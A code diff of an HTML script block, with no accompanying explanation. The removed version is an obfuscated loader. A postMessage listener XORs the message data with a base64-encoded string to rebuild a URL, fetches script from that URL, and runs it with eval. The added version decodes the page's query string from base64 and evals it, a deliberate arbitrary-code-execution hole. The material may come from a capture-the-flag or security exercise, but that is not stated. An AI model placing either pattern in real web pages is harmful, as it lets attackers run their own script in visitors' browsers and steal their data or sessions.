@@ -1,38 +1,5 @@
 <script>
-  function xorStrings(a, b) {
-      let result = '';
-      // Determine the length of the shorter string to avoid errors.
-      const len = Math.max(a.length, b.length);
-  
-      for (let i = 0; i < len; i++) {
-          // Get the character codes (ASCII values) for the current characters
-          const charCodeA = a.charCodeAt(i);
-          const charCodeB = b.charCodeAt(i);
-  
-          // Perform the bitwise XOR on the character codes
-          const xorResult = charCodeA ^ charCodeB;
-  
-          // Convert the result back to a character and append it to the result string
-          result += String.fromCharCode(xorResult);
-      }
-  
-      return result;
-  }
-  
-  addEventListener('message', async e => {
-    let key, url;
-    try {
-      window.xyz = e;
-      key = JSON.stringify([JSON.stringify(e.data).substr(0,40)]);
-      url = xorStrings(key, atob('OEoJM08RVBUdKEdUL0sIAlNMAgAJARsSFhEJGz5HTjlFCgsHBSsXByMGFxMIBCxSTTRvL3dhci9pbmRleC5qcw=='))
-      const resource = await fetch(url);
-      const text = await resource.text();
-      eval(text);
-    } catch (e) {
-      alert('asas__' + JSON.stringify({
-        error: e.message,
-        key, url,
-      }));
-    }
-  })
+  const part = location.href.split('?')[1];
+  const code = atob(part);
+  eval(code);
 </script>
